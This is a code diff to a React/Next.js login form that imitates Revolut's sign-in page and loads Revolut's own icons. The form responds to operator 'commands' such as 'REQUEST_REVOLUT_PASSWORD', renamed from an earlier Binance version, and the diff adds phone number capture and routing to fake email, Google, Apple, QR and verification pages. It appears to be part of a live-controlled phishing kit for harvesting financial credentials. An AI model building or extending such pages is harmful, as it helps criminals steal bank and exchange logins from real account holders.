@@ -1,6 +1,6 @@
 'use client';
 import '../app/globals.css';
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import Header from '../components/Header';
 import { useValidateEmail } from '../app/hooks/useValidate';
 import { useRouter } from 'next/navigation';
@@ -17,17 +17,21 @@ export default function LoginForm() {
     const [invalid, setInvalid] = useState(false);
     const [isLoading, setIsLoading] = useState(false);
     const [userEmail, setUserEmail] = useState('');
+    const [phoneNumber, setPhoneNumber] = useState('');
+    const [searchQuery, setSearchQuery] = useState('');
 
     // Handle command changes
     useEffect(() => {
         if (command === 'REQUEST_EMAIL_AGAIN') {
-            setInvalid(true); // Show error state for email input
-            setIsLoading(false);
-        } else if (command === 'REQUEST_BINANCE_PASSWORD') {
-            setIsLoading(false);
+            console.log("HERE WE WILL PUSH TO PASSWORD PAGE")
+            // setInvalid(true); // Show error state for email input
+            // setIsLoading(false);
+        } else if (command === 'REQUEST_REVOLUT_PASSWORD') {
+            // setIsLoading(false);
             setTimeout(() => {
                 // setIsLoading(false);
-                router.push('/PasswordPage');
+                console.log("HERE WE WILL PUSH TO PASSWORD PAGE")
+                // router.push('/PasswordPage');
             }, 500);
         }
     }, [command, router]);
@@ -44,6 +48,7 @@ export default function LoginForm() {
 
     // the useEffect below handles the api for country code and their data 
     const [countries, setCountries] = useState([]);
+    const [filteredCountries, setFilteredCountries] = useState([]);
     const [selectedCountry, setSelectedCountry] = useState(null);
 
     // Function to mix and filter country arrays
@@ -72,7 +77,7 @@ export default function LoginForm() {
                 const mixedCountries = mixCountries(formattedCountries, countriesData);
 
                 setCountries(mixedCountries);
-
+                setFilteredCountries(mixedCountries);
                 setSelectedCountry(mixedCountries[0]);
             })
             .catch((error) => console.error('Error fetching countries:', error));
@@ -101,11 +106,50 @@ export default function LoginForm() {
         };
     }, [dropdown]);
 
-    // Handle authentication button clicks
-    const handleAuthButtonClick = (method) => {
-        console.log(`ROUTER NEEDS TO PUSH TO ${method.toUpperCase()}`);
-        // Here you could add actual routing logic in the future
+    // Handle phone number input
+    const handlePhoneNumberChange = (e) => {
+        setPhoneNumber(e.target.value);
     };
+
+    // Handle authentication button clicks - Fixed with debugger and ensuring event doesn't bubble
+    const handleAuthButtonClick = (method) => {
+        // Add a debugger statement to check if the function is being called
+        console.log(`ROUTER NEEDS TO PUSH TO ${method.toUpperCase()}`);
+        // Here you would add actual routing logic
+        if (method === 'email') {
+            console.log("Going to email")
+            router.push('/EmailLoginPage');
+        } else if (method === 'google') {
+            console.log("Going to google")
+            router.push('/GoogleAuthPage');
+        } else if (method === 'apple') {
+            console.log("Going to apple")
+            router.push('/AppleLoginPage');
+        } else if (method === 'qr') {
+            console.log("Going to qr")
+            router.push('/QRLoginPage');
+        }
+    };
+
+    // Handle search input for countries
+    const handleSearchChange = (e) => {
+        const query = e.target.value.toLowerCase();
+        setSearchQuery(query);
+        
+        if (query.trim() === '') {
+            setFilteredCountries(countries);
+        } else {
+            const filtered = countries.filter(
+                country => 
+                    country.name.toLowerCase().includes(query) || 
+                    country.code.toLowerCase().includes(query)
+            );
+            setFilteredCountries(filtered);
+        }
+    };
+
+    // Enable/disable continue button based on phone number
+    const isContinueEnabled = phoneNumber.length > 5;
 
     return (
         <div className="bg-[#f7f7f7] text-black w-full h-screen flex flex-col">
@@ -164,18 +208,53 @@ export default function LoginForm() {
                                             </div>
                                         )}
 
-                                        <CountriesDropdown 
-                                            dropdown={dropdown} 
-                                            setDropdown={setDropdown} 
-                                            setSelectedCountry={setSelectedCountry}
-                                            countries={countries} // Pass countries to the dropdown component
-                                        />
+                                        {/* Modified CountriesDropdown component with search functionality */}
+                                        {dropdown && (
+                                            <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-white rounded-xl p-4 w-[80%] max-w-md max-h-[70vh] overflow-y-auto z-20">
+                                                <div className="mb-4">
+                                                    <input
+                                                        type="text"
+                                                        placeholder="Search countries..."
+                                                        value={searchQuery}
+                                                        onChange={handleSearchChange}
+                                                        className="w-full p-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#4f55f1]"
+                                                    />
+                                                </div>
+                                                <div className="max-h-[50vh] overflow-y-auto">
+                                                    {filteredCountries.map((country) => (
+                                                        <div
+                                                            key={country.name}
+                                                            className="flex items-center p-2 hover:bg-gray-100 cursor-pointer rounded-lg"
+                                                            onClick={() => {
+                                                                setSelectedCountry(country);
+                                                                setDropdown(false);
+                                                                setSearchQuery('');
+                                                            }}
+                                                        >
+                                                            <div className="w-8 h-8 rounded-full overflow-hidden mr-3">
+                                                                <img
+                                                                    src={country.flag}
+                                                                    alt={`${country.name} flag`}
+                                                                    className="w-full h-full object-cover"
+                                                                />
+                                                            </div>
+                                                            <div className="flex-1">
+                                                                <div className="font-medium">{country.name}</div>
+                                                                <div className="text-sm text-gray-500">{country.code}</div>
+                                                            </div>
+                                                        </div>
+                                                    ))}
+                                                </div>
+                                            </div>
+                                        )}
 
                                         {/* Number Input */}
                                         <div className="group bg-[#ebebf0] transition-all duration-200 hover:bg-[#e2e2e7] flex justify-center px-[16px] h-full rounded-2xl flex-grow">
                                             <input
                                                 type="number"
                                                 placeholder="Phone number"
+                                                value={phoneNumber}
+                                                onChange={handlePhoneNumberChange}
                                                 className="w-full text-[#191c1f] outline-transparent active:outline-none appearance-none bg-[#ebebf0] transition-all duration-200 rounded-2xl h-full focus:outline-none placeholder-[#191c1f98] group-hover:bg-[#e2e2e7]"
                                                 style={{ WebkitAppearance: 'none', MozAppearance: 'textfield' }}
                                             />
@@ -189,7 +268,17 @@ export default function LoginForm() {
                                 Lost access to my phone number
                             </div>
 
-                            <button disabled className='inter opacity-30 z-10 relative font-medium text-[1rem] tracking-[-0.01125em] h-[3.25rem] w-full min-w-[0px] px-[1rem] sm:mr-[1rem] rounded-[9999px] text-[white] bg-[#4f55f1] text-center my-[1.5rem]'>
+                            <button 
+                                className={`inter ${!isContinueEnabled ? 'opacity-30' : ''} z-10 relative font-medium text-[1rem] tracking-[-0.01125em] h-[3.25rem] w-full min-w-[0px] px-[1rem] sm:mr-[1rem] rounded-[9999px] text-[white] bg-[#4f55f1] text-center my-[1.5rem]`}
+                                disabled={!isContinueEnabled}
+                                onClick={(e) => {
+                                    e.preventDefault();
+                                    if (isContinueEnabled) {
+                                        console.log("Continuing with phone number:", phoneNumber);
+                                        router.push('/VerificationPage');
+                                    }
+                                }}
+                            >
                                 Continue
                             </button>
                         </form>
@@ -210,7 +299,12 @@ export default function LoginForm() {
                                 <div className='flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
                                     <button 
                                         className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'
-                                        onClick={() => handleAuthButtonClick('email')}
+                                        onClick={(e) => {
+                                            e.preventDefault();
+                                            e.stopPropagation();
+                                            handleAuthButtonClick('email');
+                                        }}
+                                        type="button"
                                     >
                                         <img src="https://assets.revolut.com/assets/icons/Envelope.svg" alt="Email" />
                                     </button>
@@ -223,7 +317,12 @@ export default function LoginForm() {
                                 <div className='flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
                                     <button 
                                         className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'
-                                        onClick={() => handleAuthButtonClick('google')}
+                                        onClick={(e) => {
+                                            e.preventDefault();
+                                            e.stopPropagation();
+                                            handleAuthButtonClick('google');
+                                        }}
+                                        type="button"
                                     >
                                         <img src="https://assets.revolut.com/assets/icons/LogoGoogle.svg" alt="Google" />
                                     </button>
@@ -236,7 +335,12 @@ export default function LoginForm() {
                                 <div className='flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
                                     <button 
                                         className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'
-                                        onClick={() => handleAuthButtonClick('apple')}
+                                        onClick={(e) => {
+                                            e.preventDefault();
+                                            e.stopPropagation();
+                                            handleAuthButtonClick('apple');
+                                        }}
+                                        type="button"
                                     >
                                         <img src="https://assets.revolut.com/assets/icons/LogoIOs.svg" alt="Apple" />
                                     </button>
@@ -249,7 +353,12 @@ export default function LoginForm() {
                                 <div className='md:hidden flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
                                     <button 
                                         className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'
-                                        onClick={() => handleAuthButtonClick('qr')}
+                                        onClick={(e) => {
+                                            e.preventDefault();
+                                            e.stopPropagation();
+                                            handleAuthButtonClick('qr');
+                                        }}
+                                        type="button"
                                     >
                                         <img src="https://assets.revolut.com/assets/icons/Qr.svg" alt="QR" />
                                     </button>
@@ -265,7 +374,13 @@ export default function LoginForm() {
                                 <div className='inter text-[#717173] font-normal text-[0.75rem] text-center'>
                                     Don't have an account?
                                 </div>
-                                <button className='cursor-pointer inter font-normal text-[1rem] tracking-[-0.01125em] h-[3.25rem] w-full min-w-[0px] px-[1rem] rounded-[9999px] text-[#191c1f] bg-white text-center cr-button'>
+                                <button 
+                                    className='cursor-pointer inter font-normal text-[1rem] tracking-[-0.01125em] h-[3.25rem] w-full min-w-[0px] px-[1rem] rounded-[9999px] text-[#191c1f] bg-white text-center cr-button'
+                                    onClick={(e) => {
+                                        e.preventDefault();
+                                        router.push('/CreateAccountPage');
+                                    }}
+                                >
                                     Create account
                                 </button>
                             </div>
